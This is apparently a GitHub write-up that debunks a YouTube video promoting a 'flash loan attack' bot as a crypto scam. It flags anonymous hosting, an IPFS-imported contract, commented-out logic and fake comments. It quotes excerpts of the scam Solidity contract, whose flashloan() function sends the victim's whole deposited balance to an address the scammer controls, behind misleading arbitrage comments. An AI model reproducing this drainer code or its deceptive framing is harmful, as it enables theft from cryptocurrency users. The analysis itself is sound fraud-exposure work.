# Flash Loan Scam on YouTube
Analysis of "flash loan attack" from YouTuber https://www.youtube.com/watch?v=HynfsKoFlaw&amp;t=105s

## Background

The YouTuber "Crypto Academy" https://www.youtube.com/channel/UCgiMBbCjQnaf2q3_cs06KOw  posted a video on how to orchestrate a FlashLoan attack.  I decided to verify the claims of this video by inspecting the code. This is my analysis of the video with a review of the code.

## Concern 1:  Code on GhostBin
The attack code is on GhostBin, an anonymous file sharing platform not GitHub or GitHub gist. 

![Screenshot from 2021-07-05 10-57-20](https://user-images.githubusercontent.com/8411406/124406464-c7a78c00-dd84-11eb-9346-c34d5901b30a.png)

## Concern 2:  Code on IPFS
From the GhostBin code the contract imports a contract from IPFS at QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923.  This obfiscates the code from anyone wanting to inspect what the contract does.  I have included the IPFS code in this repo to inspect. 

## Conern 3:  Bad / unknown addresses
In the IPFS file LN 128 references the contract `0x9c7770E88dd4c4F972283E97B4FeBD2991e0E05B`.  This does not exist on the Ethereum blockchain.   https://etherscan.io/address/0x9c7770E88dd4c4F972283E97B4FeBD2991e0E05B

![Screenshot from 2021-07-05 11-02-31](https://user-images.githubusercontent.com/8411406/124406453-c2e2d800-dd84-11eb-9cb3-70695158b179.png)
![Screenshot from 2021-07-05 10-56-40](https://user-images.githubusercontent.com/8411406/124406486-d42be480-dd84-11eb-9dd4-6c875167c8bb.png)

# Inspecting the code
After downloading the IPFS file [QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923](/QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923) there are a lot of concerns!

## Concern 4:  Commented out code
Code in the "Router" contract are commented out and done using the `/*` method instead of `\\` which is technically correct, but easy to miss unless put into an IDE such as VS Code.

```
    function lendingPoolFlashloan(uint256 _asset) public pure {
        uint256 data = _asset; 
        require(data != 0, "Data can't be 0.");/*
        uint amount = 1 BNB;

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _asset, amount, data);*/
    }
```

![Screenshot from 2021-07-05 11-21-05](https://user-images.githubusercontent.com/8411406/124405982-6501c080-dd83-11eb-82dd-779f54591bf4.png)

Lots of methods are simply commented out or do nothing, such as 

```
    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    function completeTransation(uint256 balanceAmount) public pure {
        require(balanceAmount >= 0, "Amount should be greater than 0!");
    }
```

## Concern 5:  SENDING ALL THE ETH!
In the method "flashloan", LN44 sweeps the entire amount of the Ethereum in the contract.  The premis of the video is to use borrowed funds, not your own ETH to attack defi contracts such as UniSwap.

* NOTE THE AUTHOUR OF THE VIDEO ASKS YOU TO FUND THE CONTRACT.  In otherwords, he will sweep this ETH.  In the video at 5:12 https://youtu.be/HynfsKoFlaw?t=312 the other funds his contract with 0.2 BNB.  This is what will be swept from you.

```
	function flashloan() public payable {
    	// Send required coins for swap
    	address(uint160(router.pancakeSwapAddress())).transfer(
        	address(this).balance
    	);

    	//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    	router.borrowFlashloanFromMultiplier(
        	address(this),
        	router.bakerySwapAddress(),
        	flashLoanAmount
    	);

    	//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
    	//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
    	//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    	router.transferBnbToMultiplier(router.pancakeSwapAddress());
    	//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    	router.completeTransation(address(this).balance);
	}
```

![Screenshot from 2021-07-05 11-28-41](https://user-images.githubusercontent.com/8411406/124406426-b199cb80-dd84-11eb-96ca-13e10c5a344e.png)


# Socials 
## Concern 6: Social profile
The YouTuber only has a few followings and only 3 videos at time of writing on "Flash Loans"
![Screenshot from 2021-07-05 10-55-32](https://user-images.githubusercontent.com/8411406/124405464-11db3e00-dd82-11eb-8346-de1eac423640.png)

## Concern 6: Fake comments
There are profiles such as "Marcus Canton" with no profile image commenting "Amazing I did it twice and earned over 5BNB. Great JOB!!".  Clicking "his" profile shows they only registered a few days ago at time of writing.

![Screenshot from 2021-07-05 11-07-01](https://user-images.githubusercontent.com/8411406/124405446-038d2200-dd82-11eb-80d0-dad085fabfba.png)


# Final words
Stay safe out there!  Visit real meetups like www.bitcoinbrisbane.com.au or meetup.com/bitcoinbrisbane to get real information.

```text
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

This review of https://www.youtube.com/watch?v=HynfsKoFlaw was performed by lucas@bitcoinbrisbane.com.au
-----BEGIN PGP SIGNATURE-----

iQHRBAEBCgA7FiEE9oqpBrW+YBrEnvg9xh+XXeve3GsFAmDiaqodHGx1Y2FzQGJp
dGNvaW5icmlzYmFuZS5jb20uYXUACgkQxh+XXeve3GsFNgwAx7mB0Qqn8K/zDmzF
DH91d84Bx005wy3EkW7YV1a7slCcp/nS+oDjOXASOoOgCPOY07eMwFMwW8FpPqdJ
8ErhFJ/SDkVYMeANF1O5uDMddHVeQvHqvXOncQdzZRUbIB57WCobFls18WTi7o9h
k3gvhYdfCVyyX3b5nKeDGYGxypTX//+Xuq3tYkCQppBnExbgsu4791DGZJrS3nRJ
WNcc+O21+LUvjH+Om8By4nHt2Y80K1ujJz2RpYi1qGf6hzAKH+LFkixjAFiG4U1C
IiO/ey2iTmb2RVYsYl5YTFlWScHqWzMtpS8+8y5/vJO0cmGZLLEAuCYB+JxXuf2/
uvL8p+LoPCpWfMJTTvviJoffXBXwNsS9Uyva7u6sKM6NIhIaMGit7pHnaXgwt1xb
/NUFY6e4rBdX9DPtuj5H5y4t2iCF3KyaMsvfN46w39RlWQ6SjPMZhN6ndGY+p0Lt
Of2xoI+N1z5kKuL2MLQgzFfAG0yybKGP7aFLbjBAy1AZ8ugU
=mPc6
-----END PGP SIGNATURE-----
```
